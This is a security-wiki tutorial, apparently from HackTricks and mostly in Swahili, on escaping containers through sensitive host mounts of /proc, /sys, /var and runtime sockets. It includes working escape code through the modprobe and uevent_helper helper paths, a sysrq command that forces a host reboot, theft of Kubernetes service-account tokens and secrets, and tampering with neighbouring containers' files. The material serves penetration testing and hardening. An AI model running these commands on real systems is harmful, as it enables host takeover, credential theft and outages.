# Mounts nyeti za mwenyeji

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Host mounts ni miongoni mwa nyuso muhimu zaidi za vitendo za container-escape kwa sababu mara nyingi hukomesha mtazamo uliotengwa wa mchakato na kurudisha hadi mwonekano wa moja kwa moja wa rasilimali za mwenyeji. Matukio hatari hayako tu kwa `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au njia zinazohusiana na device zinaweza kufichua udhibiti wa kernel, credentials, filesystems za container jirani, na interfaces za usimamizi wa runtime.

Ukurasa huu umewekwa kando kutoka kwa kurasa za ulinzi za mtu mmoja mmoja kwa sababu jinsi inavyoweza kutumiwa vibaya inagusa maeneo mbalimbali. Host mount inayoweza kuandikwa ni hatari kwa sehemu kwa sababu ya mount namespaces, kwa sehemu kwa sababu ya user namespaces, kwa sehemu kwa sababu ya kufunikwa kwa AppArmor au SELinux, na kwa sehemu kwa sababu ya njia halisi ya host iliyofichuliwa. Kuichukulia kama mada yake mwenyewe hufanya uso wa shambulio kuwa rahisi kueleweka.

## `/proc` Exposure

procfs inajumuisha taarifa za kawaida za mchakato pamoja na interfaces za udhibiti wa kernel zenye athari kubwa. Bind mount kama `-v /proc:/host/proc` au mtazamo wa container unaofichua proc entries zisizotarajiwa zinazoweza kuandikwa unaweza hivyo kusababisha ufunuo wa taarifa, denial of service, au utekelezaji wa moja kwa moja wa code kwenye host.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Matumizi mabaya

Anza kwa kuangalia ni procfs entries za thamani kubwa zipi zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za utekelezaji wa msimbo kwenye mwenyeji ikiwa zinaweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo vya uchunguzi vyenye nguvu kwa ajili ya kernel exploitation. `sched_debug` na `mountinfo` zinafunua muktadha wa process, cgroup, na filesystem ambao unaweza kusaidia kujenga upya mpangilio wa mwenyeji kutoka ndani ya container.

Thamani ya vitendo kwa kila njia ni tofauti, na kuzipanga zote kana kwamba zina athari sawa kunafanya triage kuwa ngumu:

- `/proc/sys/kernel/core_pattern`
Ikiwa inaweza kuandikwa, hii ni mojawapo ya njia za procfs zenye athari kubwa kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwa payload iliyohifadhiwa kwenye overlay yake au katika njia iliyopachikwa ya mwenyeji mara nyingi inaweza kupata utekelezaji wa msimbo kwenye mwenyeji. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
Njia hii inadhibiti userspace helper inayotumika na kernel wakati inahitaji kuendesha module-loading logic. Ikiwa inaweza kuandikwa kutoka container na kutafsiriwa katika muktadha wa mwenyeji, inaweza kuwa primitive nyingine ya utekelezaji wa msimbo kwenye mwenyeji. Inavutia hasa inapoambatana na njia ya kusababisha helper path.
- `/proc/sys/vm/panic_on_oom`
Hii kwa kawaida si primitive safi ya kutoroka, lakini inaweza kubadilisha shinikizo la kumbukumbu kuwa denial of service ya mwenyeji nzima kwa kugeuza vigezo vya OOM kuwa tabia ya kernel panic.
- `/proc/sys/fs/binfmt_misc`
Ikiwa kiolesura cha usajili kinaweza kuandikwa, mdukuzi anaweza kusajili handler kwa magic value aliyochagua na kupata utekelezaji katika muktadha wa mwenyeji wakati faili inayofanana inapoendeshwa.
- `/proc/config.gz`
Inafaa kwa triage ya kernel exploit. Inasaidia kubaini ni subsystems gani, mitigations, na vipengele vya hiari vya kernel vimewezeshwa bila kuhitaji metadata ya package za mwenyeji.
- `/proc/sysrq-trigger`
Kimsingi njia ya denial-of-service, lakini ni hatari sana. Inaweza ku-reboot, kusababisha panic, au vinginevyo kutatiza mwenyeji mara moja.
- `/proc/kmsg`
Inaonyesha ujumbe za kernel ring buffer. Inafaa kwa host fingerprinting, uchambuzi wa crash, na katika mazingira mengine kwa leaking information ambayo inasaidia kernel exploitation.
- `/proc/kallsyms`
Ina thamani wakati inapasuka kusomwa kwa sababu inaonyesha taarifa za exported kernel symbols na inaweza kusaidia kupambana na assumptions za address randomization wakati wa ukuzaji wa kernel exploit.
- `/proc/[pid]/mem`
Hii ni kiolesura cha moja kwa moja kwa kumbukumbu ya process. Ikiwa process lengwa inaweza kufikiwa kwa masharti yanayofanana na ptrace, inaweza kuruhusu kusoma au kubadilisha kumbukumbu ya process nyingine. Athari halisi inategemea sana kwa credentials, `hidepid`, Yama, na vikwazo vya ptrace, hivyo ni njia yenye nguvu lakini yenye masharti.
- `/proc/kcore`
Inaonyesha mtazamo wa aina ya core-image wa kumbukumbu ya mfumo. Faili ni kubwa na ni ngumu kutumia, lakini kama inaweza kusomwa kwa maana, inaonyesha uso wa kumbukumbu wa mwenyeji uliotolewa vibaya.
- `/proc/kmem` and `/proc/mem`
Interfaces za raw memory zenye athari kubwa kihistoria. Katika mifumo mingi ya kisasa zimeshativishwa au zimewekewa vikwazo vingi, lakini ikiwa zipo na zinaweza kutumika zinapaswa kuchukuliwa kama ugunduzi muhimu.
- `/proc/sched_debug`
Leaks taarifa za scheduling na task ambazo zinaweza kufichua vitambulisho vya process za mwenyeji hata wakati maoni mengine ya process yanaonekana safi zaidi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
Inafaa sana kwa kujenga upya ni wapi container kwa kweli iko kwenye mwenyeji, ni njia zipi zinategemea overlay, na ikiwa mount inayoweza kuandikwa inahusiana na maudhui ya mwenyeji au ni kwa layer ya container pekee.

Ikiwa `/proc/[pid]/mountinfo` au maelezo ya overlay yanaweza kusomwa, tumia hayo kurejesha njia ya mwenyeji ya filesystem ya container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu mbinu kadhaa za host-execution zinahitaji kubadilisha njia ndani ya container kuwa njia inayolingana kutoka kwa mtazamo wa host.

### Mfano Kamili: `modprobe` Helper Path Abuse

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka ndani ya container na helper path inatafsiriwa katika host context, inaweza kupelekwa kwa payload inayodhibitiwa na mshambulizi:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kichocheo halisi kinategemea lengo na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuielekeza mwito wa helper wa kernel wa baadaye kwa maudhui ya host-path yanayodhibitiwa na mshambuliaji.

### Mfano Kamili: Kernel Recon na `kallsyms`, `kmsg`, na `config.gz`

Ikiwa lengo ni exploitability assessment badala ya kutoroka papo hapo:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
These commands help answer whether useful symbol information is visible, whether recent kernel messages reveal interesting state, and which kernel features or mitigations are compiled in. The impact is usually not direct escape, but it can sharply shorten kernel-vulnerability triage.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na inafikia host view:
```bash
echo b > /proc/sysrq-trigger
```
Athari ni host reboot ya mara moja. Hii si mfano mpole, lakini inaonyesha wazi kwamba ufichaji wa procfs unaweza kuwa mbaya zaidi kuliko ufichuzi wa taarifa.

## `/sys` Ufichaji

sysfs inaonyesha kiasi kikubwa cha kernel na state za device. Baadhi ya paths za sysfs zinatumika zaidi kwa fingerprinting, wakati nyingine zinaweza kuathiri helper execution, tabia ya device, configuration ya security-module, au state ya firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hizi paths ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya thermal-management na hivyo kuathiri stability ya host katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza leak crash-dump na kernel-layout information zinazosaidia kwa host fingerprinting ya ngazi ya chini. `/sys/kernel/security` ni interface ya `securityfs` inayotumika na Linux Security Modules, hivyo access isiyotarajiwa huko inaweza expose au kubadilisha state zinazohusiana na MAC. EFI variable paths zinaweza kuathiri firmware-backed boot settings, zikifanya ziwe mbaya zaidi kuliko ordinary configuration files. `debugfs` chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu ni interface iliyoundwa kwa watengenezaji na ina matarajio ya usalama machache zaidi ikilinganishwa na hardened production-facing kernel APIs.

Amri za kuchunguza zinazofaa kwa paths hizi ni:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` inaweza kufichua ikiwa AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo inapaswa kuwa ya mwenyeji pekee.
- `/sys/kernel/debug` mara nyingi ni ugunduzi wa kuhuzunisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mounted na inasomwa au inaandikwa, tarajia uso mpana unaoelekezwa kwa kernel ambao hatari yake halisi inategemea debug nodes zilizoamilishwa.
- EFI variable exposure ni nadra zaidi, lakini ikiwa ipo ina athari kubwa kwa sababu inagusa mipangilio inayoungwa mkono na firmware badala ya mafaili ya kawaida ya runtime.
- `/sys/class/thermal` hasa inahusiana na utulivu wa mwenyeji na mwingiliano wa vifaa, sio kwa ajili ya kutoroka kwa shell kwa mtindo mzuri.
- `/sys/kernel/vmcoreinfo` hasa ni chanzo cha host-fingerprinting na uchambuzi wa crash, muhimu kwa kuelewa hali za chini za kernel.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaandikwa, kernel inaweza kutekeleza helper inayodhibitiwa na mshambuliaji wakati `uevent` inapoamshwa:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu inavyofanya kazi ni kwamba helper path hufasiriwa kutoka kwa mtazamo wa mwenyeji (host). Mara inapoamshwa, helper inaendesha katika muktadha wa host badala ya ndani ya container ya sasa.

## Mfiduo wa `/var`

Ku-mount `/var` ya mwenyeji ndani ya container mara nyingi huhesabiwa chini kwa sababu haionekani kuwa ya kustaajabisha kama ku-mount `/`. Kwa vitendo inaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na filesystem za programu jirani. Kwenye nodes za kisasa, `/var` mara nyingi ndiko kunakoishi hali za container zenye umuhimu mkubwa wa operesheni.

### Mfano wa Kubernetes

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa mount inafichua tu data ya kawaida ya programu au high-impact cluster credentials. Service-account token inayoweza kusomwa inaweza mara moja kubadilisha local code execution kuwa Kubernetes API access.

Iwapo token ipo, thibitisha ni nini inaweza kufikia badala ya kuacha kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Token yenye RBAC mpana inaweza kugeuza `/var` iliyowekwa kuwa chanzo cha kuvunjwa kwa usalama kwa cluster nzima.

### Docker na containerd Mfano

Katika host za Docker data husika mara nyingi huwa chini ya `/var/lib/docker`, wakati kwenye node za Kubernetes zinazoendeshwa na containerd inaweza kuwa chini ya `/var/lib/containerd` au njia maalum za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa ` /var` iliyopachikwa inaonyesha yaliyomo ya snapshot yanayoweza kuandikwa ya workload nyingine, attacker anaweza kubadilisha mafaili ya application, kuweka web content, au kubadilisha startup scripts bila kugusa configuration ya container ya sasa.

Mawazo maalum ya matumizi mabaya mara yaliyomo ya snapshot yanayoweza kuandikwa yatakapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za `/var` iliyopachikwa: application tampering, secret recovery, na lateral movement kuelekea workloads jirani.

## Sockets za runtime

Mounts nyeti za mwenyeji mara nyingi zinajumuisha sockets za runtime badala ya saraka kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kurudiwa hapa waziwazi:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Angalia [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa full exploitation flows mara tu moja ya sockets hizi itakapowekwa.

Kama muundo wa haraka wa mwingiliano wa kwanza:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ikiwa mojawapo ya hizi itafanikiwa, njia kutoka "mounted socket" hadi "start a more privileged sibling container" kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.

## CVE zinazohusiana na mounts

Host mounts pia zinaungana na udhaifu wa runtime. Mifano muhimu ya hivi karibuni ni:

- `CVE-2024-21626` katika `runc`, ambapo leaked directory file descriptor inaweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651` na `CVE-2024-23653` katika BuildKit, ambapo OverlayFS copy-up races zinaweza kusababisha host-path writes wakati wa builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts wakati wa build zinaweza kufichua `/` kuwa read-write.
- `CVE-2024-40635` katika containerd, ambapo value kubwa ya `User` inaweza kusababisha overflow hadi tabia ya UID 0.

Hizi CVE zinatofautiana hapa kwa sababu zinaonyesha kwamba utunzaji wa mounts sio tu kuhusu usanidi wa operator. Runtime yenyewe pia inaweza kuanzisha mount-driven escape conditions.

## Checks

Tumia amri hizi kupata kwa haraka mount exposures zenye thamani kubwa:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets ni matokeo zenye kipaumbele cha juu.
- Mafungu ya proc/sys yanayoweza kuandikwa mara nyingi yanaonyesha kuwa mount inafichua host-global kernel controls badala ya mtazamo salama wa container.
- Njia zilizopakiwa za `/var` zinastahili ukaguzi wa credential na neighboring-workload, si ukaguzi wa filesystem peke yake.
{{#include ../../../banners/hacktricks-training.md}}
